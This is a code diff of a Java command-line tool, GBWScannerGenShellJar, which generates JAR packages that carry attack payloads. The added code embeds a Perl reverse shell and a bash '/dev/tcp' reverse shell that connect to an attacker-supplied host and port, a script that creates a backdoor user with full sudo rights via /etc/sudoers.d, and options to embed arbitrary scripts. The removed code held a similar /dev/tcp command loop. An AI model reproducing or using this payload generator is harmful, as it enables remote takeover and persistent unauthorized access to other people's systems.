@@ -3,140 +3,147 @@ package com.gbw.scanner.tools;
 import com.gbw.scanner.utils.FileUtils;
 import org.apache.commons.cli.*;
 
-import java.io.BufferedReader;
+import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStreamReader;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.jar.JarEntry;
+import java.util.jar.JarOutputStream;
 
 public class GBWScannerGenShellJar {
 
 
-    private static String runCmdTemplate = "  \n" +
-            "            package mygbw.attack;  \n" +
-            "            import java.io.InputStream;\n" +
-            "            import java.util.ArrayList;\n" +
-            "            import java.util.List;\n" +
-            "                       \n" +
-            "            public class %s {\n" +
-            "                public %s() {\n" +
-            "                }\n" +
-            "                                \n" +
-            "                private static String doShell(List<String> cmd) throws Exception{\n" +
-            "                    StringBuffer sb = new StringBuffer();\n" +
-            "                    byte[] buffer = new byte[1024];\n" +
-            "                    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n" +
-            "                    processBuilder.redirectErrorStream(true);\n" +
-            "                    Process process = processBuilder.start();\n" +
-            "                    InputStream stream = process.getInputStream();\n" +
-            "                       \n" +
-            "                    while(stream.read(buffer) != -1) {\n" +
-            "                        sb.append(new String(buffer));\n" +
-            "                    }\n" +
-            "                       \n" +
-            "                    stream.close();\n" +
-            "                    if (process.isAlive()) {\n" +
-            "                        process.waitFor();\n" +
-            "                    }\n" +
-            "                       \n" +
-            "                    return sb.toString();\n" +
-            "                }\n" +
-            "                                                  \n" +
-            "                public static void main(String[] args) throws Exception {\n" +
-            "         \n" +
-            "                   String[] cmds = \"%s\".split(\",\");\n" +
-            "                   List<String> cmdList = new ArrayList<>();\n" +
-            "                   for(String c:cmds){\n" +
-            "                       cmdList.add(c);\n" +
-            "                   }\n" +
-            "                   \n" +
-            "                  doShell(cmdList); \n" +
-            "        \n" +
-            "                }\n" +
-            "            }";
+    private static String getJarFilePath(String jclass,boolean isMove){
 
-    private static String JAR_MAINFILE_TEMPLATE = "Manifest-Version: 1.0\n" +
-            "Archiver-Version: Plexus Archiver\n" +
-            "Created-By: Apache Maven 3.6.0\n" +
-            "Built-By: root\n" +
-            "Build-Jdk: 13.0.1\n" +
-            "Main-Class: mygbw.attack.%s\n";
+        if(isMove){
 
-
-    private static String getshellTemplate = "/bin/bash,-c,exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done";
-
-
-    private static String JarFilePath = "/tmp/jar/";
-
-    private static String getJarFilePath(){
-
-        return String.format("/tmp/jar/%d/",System.currentTimeMillis());
-    }
-
-    private static String executeCommand(String command) {
-
-        StringBuilder output = new StringBuilder();
-
-        try {
-            Process p = Runtime.getRuntime().exec(command);
-            p.waitFor();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-
-            String line;
-            while((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
+            String dir = String.format("/tmp/jar/%d",System.currentTimeMillis());
+            FileUtils.mkDirs(dir);
+            return String.format("%s/%s.jar",dir,jclass);
         }
 
-        return output.toString();
+        return String.format("%s.jar",jclass);
     }
 
-    public static String toJar(String jclass,String cmd,boolean isMove) throws IOException {
+    private static void writeJarEntry(JarOutputStream jarPut,String name,byte[] content) throws IOException {
 
-        String path = getJarFilePath();
-        String ppath = "mygbw/attack";
-        String java = String.format("%s/%s.java",ppath,jclass);
-        String jclassPath = String.format("%s/%s.class",ppath,jclass);
-        String meta = "META-INF/MANIFEST.MF";
-        String jar = String.format("%s.jar",jclass);
-        String compileCmd = String.format("javac %s",java);
-        String jarCmd = String.format("jar -cvfm %s %s %s",jar,meta,jclassPath);
-        String targetJar = String.format("%s%s",path,jar);
+        JarEntry entry = new JarEntry(name);
+        jarPut.putNextEntry(entry);
+        jarPut.write(content);
 
-        String metaContent = String.format(JAR_MAINFILE_TEMPLATE,jclass);
-        String javaContent = String.format(runCmdTemplate,jclass,jclass,cmd);
-
-        FileUtils.write(java,javaContent.getBytes());
-        FileUtils.write(meta,metaContent.getBytes());
-
-        executeCommand(compileCmd);
-        executeCommand(jarCmd);
-
-        executeCommand("rm -rf "+"mygbw"+" "+"META-INF");
-
-        //FileUtils.delete(jclassPath);
-
-        if(isMove)
-            FileUtils.move(jar,targetJar);
-
-        return isMove?targetJar:jar;
     }
 
-    public static String toShellJar(String jclass,String rhost,int rport,boolean isMove) throws IOException {
+    public static String makeJarPackage(String jclass,String jarMainClassPath,String cmd,String script,boolean isMove) throws IOException {
 
-        String cmd = String.format(getshellTemplate,rhost,rport);
-        return toJar(jclass,cmd,isMove);
+        String metaContent = "Manifest-Version: 1.0\n" +
+                "Archiver-Version: Plexus Archiver\n" +
+                "Built-By: root\n" +
+                "Build-Jdk: 1.8.0_144\n" +
+                "Main-Class: JarMain\n";
+
+        String mainClassName = FileUtils.getFileName(jarMainClassPath);
+
+        String jarFilePath = getJarFilePath(jclass,isMove);
+
+        JarOutputStream jarPut = new JarOutputStream(new FileOutputStream(jarFilePath));
+        /*write META-INF*/
+        writeJarEntry(jarPut,"META-INF/MANIFEST.MF",metaContent.getBytes());
+
+        /*write class*/
+        writeJarEntry(jarPut,mainClassName,Files.readAllBytes(Paths.get(jarMainClassPath)));
+        /*write cmd*/
+        writeJarEntry(jarPut,"cmd",cmd.getBytes());
+
+        /*write script*/
+        writeJarEntry(jarPut,"script",script.getBytes());
+
+        jarPut.close();
+
+        return jarFilePath;
+    }
+
+    public static String makePerlShell(String jclass,String jarMainClassPath,String rhost,int rport,boolean isMove) throws IOException {
+
+        String template = "#!/usr/bin/perl -w   \n" +
+                "#   \n" +
+                "  \n" +
+                "use strict;   \n" +
+                "use Socket;   \n" +
+                "use IO::Handle;   \n" +
+                "  \n" +
+                "  \n" +
+                "my $remote_ip = \"%s\";   \n" +
+                "my $remote_port = %d;   \n" +
+                "  \n" +
+                "my $proto = getprotobyname(\"tcp\");   \n" +
+                "my $pack_addr = sockaddr_in($remote_port, inet_aton($remote_ip));   \n" +
+                "  \n" +
+                "my $shell = '/bin/bash -i';   \n" +
+                "  \n" +
+                "socket(SOCK, AF_INET, SOCK_STREAM, $proto);   \n" +
+                "  \n" +
+                "STDOUT->autoflush(1);   \n" +
+                "SOCK->autoflush(1);   \n" +
+                "  \n" +
+                "connect(SOCK,$pack_addr) or die \"can not connect:$!\";   \n" +
+                "  \n" +
+                "open STDIN, \"<&SOCK\";   \n" +
+                "open STDOUT, \">&SOCK\";   \n" +
+                "open STDERR, \">&SOCK\";   \n" +
+                "  \n" +
+                "print \"Enjoy the shell.\\n\";             \n" +
+                "  \n" +
+                "system($shell);   \n" +
+                "close SOCK;   \n";
+
+        String script = String.format(template,rhost,rport);
+
+        return makeJarPackage(jclass,jarMainClassPath,"perl",script,isMove);
+    }
+
+    public static String makeBashShell(String jclass,String jarMainClassPath,String rhost,int rport,boolean isMove) throws IOException {
+        String script = String.format("/bin/bash -i >& /dev/tcp/%s/%d 0>&1",rhost,rport);
+        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
+    }
+
+    public static String makeCreateUserShell(String jclass,String jarMainClassPath,String user,String passwd,boolean isMove) throws IOException {
+
+        String template = " #!/bin/bash\n" +
+                " user=%s\n" +
+                " passwd=%s\n" +
+                " useradd $user\n" +
+                " usermod -s /bin/bash $user\n" +
+                " echo $user:$passwd |chpasswd\n" +
+                " echo '%s  ALL=(ALL)   ALL' >>/etc/sudoers.d/shark\n" +
+                " usermod -a -G wheel $user\n" +
+                " usermod -a -G sudo  $user\n";
+
+        String script = String.format(template,user,passwd,user);
+
+        return makeJarPackage(jclass,jarMainClassPath,"sh",script,isMove);
+    }
+
+    public static String makeShellFromScriptFile(String jclass,String jarMainClassPath,String cmd,String scriptFile,boolean isMove) throws IOException {
+
+        return makeJarPackage(jclass,jarMainClassPath,cmd,new String(Files.readAllBytes(Paths.get(scriptFile))),isMove);
     }
 
     public static void main(String[] args) throws ParseException, IOException {
 
         boolean isMove = false;
 
+
+
         Options opts = new Options();
 
         opts.addOption("jclass",true,"set java class name");
-        opts.addOption("cmd",true,"set will run cmd");
-        opts.addOption("shell",true,"make shell,args:<rhost>:<rport>");
+        opts.addOption("main",true,"java main class path");
+        opts.addOption("perlshell",true,"make perl shell,args:<rhost>:<rport>");
+        opts.addOption("bashshell",true,"make bash shell,args:<rhost>:<rport>");
+        opts.addOption("createuser",true,"make user,args:<user>:<passwd>");
+        opts.addOption("script",true,"make script ,args:<cmd>:<script>");
+        opts.addOption("fscript",true,"make script from file,args:<cmd>:<scriptFile>");
+
         opts.addOption("isMove",false,"move jar to target or not");
         opts.addOption("help", false, "Print usage");
 
@@ -154,18 +161,37 @@ public class GBWScannerGenShellJar {
         }
 
         String jclass = cliParser.getOptionValue("jclass");
+        String jarMainClassPath  = "/opt/data/script/jclass/JarMain.class";
+
+        if(cliParser.hasOption("main"))
+            jarMainClassPath = cliParser.getOptionValue("main");
+
 
         if(cliParser.hasOption("isMove"))
             isMove = true;
 
-        if(cliParser.hasOption("cmd")){
-
-            System.out.println(toJar(jclass,cliParser.getOptionValue("cmd"),isMove));
+        if(cliParser.hasOption("perlshell")){
+            String[] splits = cliParser.getOptionValue("perlshell").split(":");
+            System.out.println(makePerlShell(jclass,jarMainClassPath,splits[0],Integer.parseInt(splits[1]),isMove));
         }
 
-        if(cliParser.hasOption("shell")){
-            String[] splits = cliParser.getOptionValue("shell").split(":");
-            System.out.println(toShellJar(jclass,splits[0],Integer.parseInt(splits[1]),isMove));
+        if(cliParser.hasOption("bashshell")){
+            String[] splits = cliParser.getOptionValue("bashshell").split(":");
+            System.out.println(makeBashShell(jclass,jarMainClassPath,splits[0],Integer.parseInt(splits[1]),isMove));
+        }
+
+        if(cliParser.hasOption("createuser")){
+            String[] splits = cliParser.getOptionValue("createuser").split(":");
+            System.out.println(makeCreateUserShell(jclass,jarMainClassPath,splits[0],splits[1],isMove));
+        }
+
+        if(cliParser.hasOption("script")){
+            String[] splits = cliParser.getOptionValue("script").split(":");
+            System.out.println(makeJarPackage(jclass,jarMainClassPath,splits[0],splits[1],isMove));
+        }
+        if(cliParser.hasOption("fscript")){
+            String[] splits = cliParser.getOptionValue("fscript").split(":");
+            System.out.println(makeShellFromScriptFile(jclass,jarMainClassPath,splits[0],splits[1],isMove));
         }
 
     }
